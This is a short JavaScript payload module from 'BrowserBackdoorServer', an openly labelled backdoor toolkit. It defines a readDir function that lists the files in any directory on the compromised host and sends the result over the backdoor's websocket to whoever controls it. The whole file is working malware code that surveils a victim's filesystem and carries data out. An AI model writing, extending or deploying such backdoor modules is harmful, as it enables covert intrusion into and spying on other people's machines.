// INTERACTIVE
/*
 * Copyright (c) 2016 IMcPwn  - http://imcpwn.com
 * BrowserBackdoorServer by IMcPwn.
 * See the file 'LICENSE' for copying permission
 *
 * Info: Lists all files in a directory
 * Parameters: fullPath
 * Returns: undefined, error, files as string
 * Author: IMcPwn
 */

if (typeof fs == 'undefined') fs = require('fs');

readDir = function (fullPath) {
    fs.readdir(fullPath, 'utf8', function (err, data) {
        if (err) ws.send(err);
        ws.send(data);
   });
}

return "Usage: readDir(fullPath)";
